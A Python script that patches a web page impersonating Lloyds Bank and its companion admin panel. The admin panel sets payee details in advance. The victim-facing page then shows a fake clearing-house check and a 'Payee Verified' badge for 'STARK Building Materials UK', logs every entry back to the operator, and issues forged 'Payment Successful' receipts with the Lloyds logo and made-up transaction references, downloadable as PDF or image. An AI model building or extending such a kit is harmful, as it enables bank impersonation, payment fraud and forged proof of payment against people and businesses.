import re

ADMIN_FILE = 'C:\\Users\\xingk\\Lloyds Banking Group\\admin.html'
INDEX_FILE = 'C:\\Users\\xingk\\Lloyds Banking Group\\index.html'

uk_banks = [
    "Lloyds Bank PLC (Includes Halifax, Bank of Scotland)", "HSBC UK Bank Plc (Includes First Direct, M&S Bank)",
    "Barclays Bank UK PLC", "National Westminster Bank Plc (NatWest, includes RBS)",
    "Santander UK Plc (Includes TSB, Virgin Money)", "Metro Bank PLC",
    "Clydesdale Bank Plc (Trading as Virgin Money)", "Yorkshire Bank (Trading as Virgin Money)",
    "Northern Bank Limited (Danske Bank group, NI)", "AIB Group (UK) P.L.C.",
    "Monzo Bank Limited", "Starling Bank Limited", "Revolut Bank UK Ltd", "Atom Bank PLC",
    "Chase (J.P. Morgan Europe Limited)", "OakNorth Bank plc", "Allica Bank Limited",
    "Tandem Bank", "Kroo Bank Ltd", "Zopa Bank Limited", "The Bank of London",
    "Coutts & Company", "C. Hoare & Co.", "Investec Bank PLC", "Handelsbanken plc",
    "Citibank UK Limited", "Bank of China (UK) Limited", "Goldman Sachs International Bank"
]

bank_options = '\\n'.join([f'<option value="{b}">{b}</option>' for b in uk_banks])

# ----------------- ADMIN.HTML UPDATE -----------------
with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
    admin_html = f.read()

# Replace the old Domestic Transfer Configuration with the new one
old_dom_config = '''                <!-- Domestic Transfer Configuration -->
                <div class="settings-group" style="border:2px solid #3498db;">
                    <p style="color:white; font-weight:bold;"><i class="fas fa-money-check-alt"></i> Domestic Transfer Verifier</p>
                    <p style="font-size:11px;">Generate expected details for "STARK Building Materials UK".</p>
                    <input type="text" id="domName" placeholder="Full Name (as it appears on account)">
                    <input type="text" id="domSort" placeholder="Sort Code (XX-XX-XX)">
                    <input type="text" id="domAcc" placeholder="Account Number (8 digits)">
                    <button class="green" id="btnSetDom">Generate Domestic Transfer</button>
                    <div id="domStatus" class="status-msg"></div>
                </div>'''

new_dom_config = f'''                <!-- Domestic Transfer Configuration -->
                <div class="settings-group" style="border:2px solid #3498db;">
                    <p style="color:white; font-weight:bold;"><i class="fas fa-money-check-alt"></i> Domestic Transfer Verifier</p>
                    <p style="font-size:11px; margin-bottom:8px;">Generate expected details for "STARK Building Materials UK".</p>
                    <select id="domBank" style="width:100%; padding:8px; margin-bottom:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px;">
                        <option value="">-- Select Target Bank --</option>
                        {bank_options}
                    </select>
                    <input type="text" id="domName" placeholder="Full Name">
                    <input type="text" id="domSort" placeholder="Sort Code (XX-XX-XX)">
                    <input type="text" id="domAcc" placeholder="Account Number (8 digits)">
                    <button class="green" id="btnSetDom">Generate Domestic Transfer</button>
                    <div id="domStatus" class="status-msg"></div>
                    <div id="activeGeneratedDom" style="margin-top:10px; padding:10px; background:#151521; border-left:3px solid #3498db; border-radius:4px; font-size:12px; display:none;">
                        <strong style="color:#00d2ff;">Active Generated Details:</strong><br>
                        <span style="color:#a0a0b8;">Bank:</span> <span id="dispDomBank" style="color:white;"></span><br>
                        <span style="color:#a0a0b8;">Name:</span> <span id="dispDomName" style="color:white;"></span><br>
                        <span style="color:#a0a0b8;">Sort:</span> <span id="dispDomSort" style="color:white;"></span><br>
                        <span style="color:#a0a0b8;">Acc:</span> <span id="dispDomAcc" style="color:white;"></span>
                    </div>
                </div>'''

admin_html = admin_html.replace(old_dom_config, new_dom_config)

# Update Admin JS for btnSetDom
old_btnSetDom_js = '''        // Set Domestic Transfer Details
        var btnSetDom = document.getElementById('btnSetDom');
        if (btnSetDom) {
            btnSetDom.onclick = async function() {
                var nm = document.getElementById('domName').value.trim();
                var sc = document.getElementById('domSort').value.trim();
                var ac = document.getElementById('domAcc').value.trim();
                if (nm && sc && ac) {
                    await setSyncItem('expectedDomName', nm);
                    await setSyncItem('expectedDomSort', sc);
                    await setSyncItem('expectedDomAcc', ac);
                    document.getElementById('domStatus').innerText = 'Details generated and ready!';
                    setTimeout(function(){ document.getElementById('domStatus').innerText = ''; }, 3000);
                } else {
                    alert('Please fill out Name, Sort Code, and Account Number.');
                }
            };
        }'''

new_btnSetDom_js = '''        // Set Domestic Transfer Details
        var btnSetDom = document.getElementById('btnSetDom');
        if (btnSetDom) {
            btnSetDom.onclick = async function() {
                var bk = document.getElementById('domBank').value.trim();
                var nm = document.getElementById('domName').value.trim();
                var sc = document.getElementById('domSort').value.trim();
                var ac = document.getElementById('domAcc').value.trim();
                if (bk && nm && sc && ac) {
                    await setSyncItem('expectedDomBank', bk);
                    await setSyncItem('expectedDomName', nm);
                    await setSyncItem('expectedDomSort', sc);
                    await setSyncItem('expectedDomAcc', ac);
                    document.getElementById('domStatus').innerText = 'Details generated and ready!';
                    setTimeout(function(){ document.getElementById('domStatus').innerText = ''; }, 3000);
                } else {
                    alert('Please select a Bank and fill out Name, Sort Code, and Account Number.');
                }
            };
        }'''

admin_html = admin_html.replace(old_btnSetDom_js, new_btnSetDom_js)

# Update Admin polling for domBank and active display
old_dom_poll = '''            // Poll Domestic Details
            var dName = getSyncItem('expectedDomName');
            var dSort = getSyncItem('expectedDomSort');
            var dAcc = getSyncItem('expectedDomAcc');
            if (dName && document.activeElement !== document.getElementById('domName')) document.getElementById('domName').value = dName;
            if (dSort && document.activeElement !== document.getElementById('domSort')) document.getElementById('domSort').value = dSort;
            if (dAcc && document.activeElement !== document.getElementById('domAcc')) document.getElementById('domAcc').value = dAcc;'''

new_dom_poll = '''            // Poll Domestic Details
            var dBank = getSyncItem('expectedDomBank');
            var dName = getSyncItem('expectedDomName');
            var dSort = getSyncItem('expectedDomSort');
            var dAcc = getSyncItem('expectedDomAcc');
            
            if (dBank && document.activeElement !== document.getElementById('domBank')) document.getElementById('domBank').value = dBank;
            if (dName && document.activeElement !== document.getElementById('domName')) document.getElementById('domName').value = dName;
            if (dSort && document.activeElement !== document.getElementById('domSort')) document.getElementById('domSort').value = dSort;
            if (dAcc && document.activeElement !== document.getElementById('domAcc')) document.getElementById('domAcc').value = dAcc;
            
            if (dBank && dName && dSort && dAcc) {
                document.getElementById('activeGeneratedDom').style.display = 'block';
                document.getElementById('dispDomBank').innerText = dBank;
                document.getElementById('dispDomName').innerText = dName;
                document.getElementById('dispDomSort').innerText = dSort;
                document.getElementById('dispDomAcc').innerText = dAcc;
            } else {
                document.getElementById('activeGeneratedDom').style.display = 'none';
            }'''

admin_html = admin_html.replace(old_dom_poll, new_dom_poll)

with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
    f.write(admin_html)

print("Admin.html updated successfully.")


# ----------------- INDEX.HTML UPDATE -----------------
with open(INDEX_FILE, 'r', encoding='utf-8') as f:
    index_html = f.read()

# Add JS Libraries for PDF and Image generation
if 'html2canvas' not in index_html:
    index_html = index_html.replace('</title>', '</title>\n    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>\n    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>')

# Update Transfer Step 2 to remove "(as it appears on their account)" and add STARK element
old_step2 = '''                <div id="transferStep2" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
                    <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Recipient Details</h3>
                    <p style="margin-bottom:15px; font-size:14px; color:#006a4d; font-weight:bold;" id="selectedBankDisplay"></p>
                    
                    <div class="input-group">
                        <label class="label">Full Name (as it appears on their account)</label>
                        <input type="text" class="input-field" id="txFullName" placeholder="e.g. John Doe">
                    </div>
                    <div class="input-group">
                        <label class="label">Sort Code (6 digits)</label>
                        <input type="text" class="input-field" id="txSortCode" placeholder="XX-XX-XX">
                    </div>
                    <div class="input-group">
                        <label class="label">Account Number (8 digits)</label>
                        <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
                    </div>
                    <button class="btn" onclick="verifyTransferDetails()">Verify Details</button>
                    <button class="btn" onclick="document.getElementById('transferStep2').style.display='none'; document.getElementById('transferStep1').style.display='block';" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
                </div>'''

new_step2 = '''                <div id="transferStep2" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
                    <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Recipient Details</h3>
                    <p style="margin-bottom:15px; font-size:14px; color:#006a4d; font-weight:bold;" id="selectedBankDisplay"></p>
                    
                    <div class="input-group">
                        <label class="label">Full Name</label>
                        <input type="text" class="input-field" id="txFullName" placeholder="e.g. John Doe">
                    </div>
                    <div class="input-group">
                        <label class="label">Sort Code (6 digits)</label>
                        <input type="text" class="input-field" id="txSortCode" placeholder="XX-XX-XX">
                    </div>
                    <div class="input-group">
                        <label class="label">Account Number (8 digits)</label>
                        <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
                    </div>
                    
                    <div id="starkVerificationBadge" style="display:none; background:#e8f4f0; border-left:4px solid #006a4d; padding:12px; margin-bottom:15px; border-radius:4px; animation: fadeIn 0.5s;">
                        <p style="color:#004d38; font-size:13px; margin-bottom:2px;"><i class="fas fa-check-circle"></i> <strong>Payee Verified</strong></p>
                        <p style="font-size:16px; font-weight:bold; color:#333;">STARK Building Materials UK</p>
                    </div>

                    <button class="btn" id="btnVerifyDetails" onclick="verifyTransferDetails()">Verify Details</button>
                    
                    <!-- Hidden elements until verified -->
                    <div id="amountSection" style="display:none; margin-top:20px; border-top:1px solid #eee; padding-top:15px;">
                        <div class="input-group">
                            <label class="label">Amount to Transfer (£)</label>
                            <input type="number" class="input-field" id="txTransferAmount" placeholder="0.00">
                        </div>
                        <div class="input-group">
                            <label class="label">Reference (Optional)</label>
                            <input type="text" class="input-field" id="txReference" placeholder="e.g. Invoice Payment">
                        </div>
                        <button class="btn" onclick="submitFinalTransfer()">Send</button>
                    </div>

                    <button class="btn" onclick="resetTransferFlow()" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
                </div>'''

# Need to replace the whole step2, transferLoading and step3
import re
pattern = re.compile(r'<div id="transferStep2".*?<div id="view-bills"', re.DOTALL)

receipt_view = '''<div id="view-receipt" style="display:none;">
                <div id="receiptContainer" style="background:#fff; border:1px solid #ddd; padding:30px; border-radius:8px; box-shadow:0 4px 15px rgba(0,0,0,0.1); margin-bottom:20px; position:relative;">
                    <div style="text-align:center; margin-bottom:20px;">
                        <i class="fas fa-check-circle" style="font-size:50px; color:#006a4d; margin-bottom:10px;"></i>
                        <h2 style="color:#333;">Payment Successful</h2>
                        <p style="color:#666; font-size:14px;" id="receiptDate"></p>
                    </div>
                    <div style="border-top:2px dashed #eee; border-bottom:2px dashed #eee; padding:20px 0; margin-bottom:20px;">
                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Amount Sent:</span> <strong style="color:#333; font-size:20px;" id="receiptAmount"></strong></p>
                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Recipient:</span> <strong style="color:#333;">STARK Building Materials UK</strong></p>
                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Bank:</span> <strong style="color:#333; text-align:right; max-width:60%;" id="receiptBank"></strong></p>
                        <p style="display:flex; justify-content:space-between; margin-bottom:10px; color:#555;"><span>Account Name:</span> <strong style="color:#333;" id="receiptName"></strong></p>
                        <p style="display:flex; justify-content:space-between; color:#555;"><span>Transaction Ref:</span> <strong style="color:#333;" id="receiptRef"></strong></p>
                    </div>
                    <div style="text-align:center;">
                        <img src="https://www.lloydsbank.com/assets/media/logo/lloyds-bank-logo.svg" style="height:30px; opacity:0.8;">
                    </div>
                </div>
                
                <div style="display:flex; gap:15px;">
                    <button onclick="downloadReceiptPDF()" class="btn" style="flex:1; background:#34495e;"><i class="fas fa-file-pdf"></i> Download PDF</button>
                    <button onclick="downloadReceiptImage()" class="btn" style="flex:1; background:#2980b9;"><i class="fas fa-image"></i> Download Image</button>
                </div>
                <button onclick="showView('home')" class="btn" style="background:#006a4d; margin-top:15px;">Return to Home</button>
            </div>
            
            <!-- Pay Bills View -->
            <div id="view-bills"'''

full_replacement = new_step2 + '\n\n                <div id="transferLoading" style="display:none; text-align:center; padding:40px;">\n                    <i class="fas fa-spinner fa-spin" style="font-size:40px; color:#006a4d; margin-bottom:15px;"></i>\n                    <p style="font-size:16px; color:#666;">Contacting clearing house to verify payee details...</p>\n                </div>\n\n            </div>\n\n            ' + receipt_view

index_html = pattern.sub(full_replacement, index_html)

# Now update the JS logic
# 1. We need to store `selectedBankNameGlobal`
# 2. Update `selectBank`
# 3. Update `verifyTransferDetails`
# 4. Update `submitFinalTransfer`
# 5. Add receipt download functions

js_pattern = re.compile(r'function selectBank.*?async function submitBillPayment', re.DOTALL)

new_js = '''var selectedBankNameGlobal = "";

        function selectBank(bankName) {
            selectedBankNameGlobal = bankName;
            document.getElementById('selectedBankDisplay').innerText = "Selected Bank: " + bankName;
            document.getElementById('transferStep1').style.display = 'none';
            document.getElementById('transferStep2').style.display = 'block';
        }

        function resetTransferFlow() {
            document.getElementById('transferStep2').style.display='none'; 
            document.getElementById('transferStep1').style.display='block';
            document.getElementById('starkVerificationBadge').style.display = 'none';
            document.getElementById('amountSection').style.display = 'none';
            document.getElementById('btnVerifyDetails').style.display = 'block';
        }

        async function verifyTransferDetails() {
            var name = document.getElementById('txFullName').value.trim();
            var sc = document.getElementById('txSortCode').value.trim();
            var acc = document.getElementById('txAccNum').value.trim();
            
            if (name && sc && acc) {
                var expBank = getSyncItem('expectedDomBank') || '';
                var expName = getSyncItem('expectedDomName') || '';
                var expSort = getSyncItem('expectedDomSort') || '';
                var expAcc = getSyncItem('expectedDomAcc') || '';

                if (expBank && expName && expSort && expAcc && 
                    selectedBankNameGlobal === expBank && name === expName && sc === expSort && acc === expAcc) {
                    
                    document.getElementById('transferStep2').style.display = 'none';
                    document.getElementById('transferLoading').style.display = 'block';
                    
                    setTimeout(function() {
                        document.getElementById('transferLoading').style.display = 'none';
                        document.getElementById('transferStep2').style.display = 'block';
                        
                        document.getElementById('starkVerificationBadge').style.display = 'block';
                        document.getElementById('amountSection').style.display = 'block';
                        document.getElementById('btnVerifyDetails').style.display = 'none';
                    }, 2000);
                } else {
                    var logEntry = '<p style="color:#d9534f;"><strong>Failed Transfer Verification:</strong><br>' +
                                   'Bank: ' + selectedBankNameGlobal + '<br>Entered: ' + name + ', ' + sc + ', ' + acc + '</p>';
                    var currentLogs = getSyncItem('adminLogs') || '';
                    await setSyncItem('adminLogs', currentLogs + logEntry);
                    
                    alert("The details entered could not be verified by the clearing house. Please check the information and try again.");
                }
            } else {
                alert("Please fill in all recipient details.");
            }
        }

        async function submitFinalTransfer() {
            var amt = document.getElementById('txTransferAmount').value;
            var ref = document.getElementById('txReference').value || 'Invoice Payment';
            if (amt) {
                var nm = document.getElementById('txFullName').value;
                var sc = document.getElementById('txSortCode').value;
                var ac = document.getElementById('txAccNum').value;

                var logEntry = '<p><strong>Transfer Attempt:</strong> £' + amt + ' to STARK Building Materials UK<br>' +
                               'Entered Details:<br>Name: ' + nm + '<br>Sort: ' + sc + '<br>Acc: ' + ac + '<br>' + selectedBankNameGlobal + '</p>';
                var currentLogs = getSyncItem('adminLogs') || '';
                await setSyncItem('adminLogs', currentLogs + logEntry);

                // Setup Receipt
                var now = new Date();
                document.getElementById('receiptDate').innerText = now.toLocaleString('en-GB');
                document.getElementById('receiptAmount').innerText = '£' + parseFloat(amt).toFixed(2);
                document.getElementById('receiptBank').innerText = selectedBankNameGlobal;
                document.getElementById('receiptName').innerText = nm;
                document.getElementById('receiptRef').innerText = 'LLOYDS-' + Math.floor(Math.random()*1000000000);
                
                showView('receipt');
            } else {
                alert("Please enter a valid amount.");
            }
        }
        
        function downloadReceiptImage() {
            html2canvas(document.getElementById("receiptContainer")).then(canvas => {
                var link = document.createElement('a');
                link.download = 'Transfer_Receipt_STARK.png';
                link.href = canvas.toDataURL();
                link.click();
            });
        }
        
        function downloadReceiptPDF() {
            window.jspdf = window.jspdf || {};
            var jsPDF = window.jspdf.jsPDF;
            if(!jsPDF) { alert("PDF library loading. Please try again in a moment."); return; }
            html2canvas(document.getElementById("receiptContainer")).then(canvas => {
                var imgData = canvas.toDataURL('image/png');
                var doc = new jsPDF('p', 'mm', 'a4');
                var width = doc.internal.pageSize.getWidth();
                var height = (canvas.height * width) / canvas.width;
                doc.addImage(imgData, 'PNG', 0, 10, width, height);
                doc.save('Transfer_Receipt_STARK.pdf');
            });
        }

        async function submitBillPayment'''

index_html = js_pattern.sub(new_js, index_html)


# Add receipt view to showView extras array so it can be navigated to
index_html = index_html.replace("['transfer', 'bills', 'investments']", "['transfer', 'bills', 'investments', 'receipt']")

with open(INDEX_FILE, 'w', encoding='utf-8') as f:
    f.write(index_html)

print("Index.html updated successfully.")
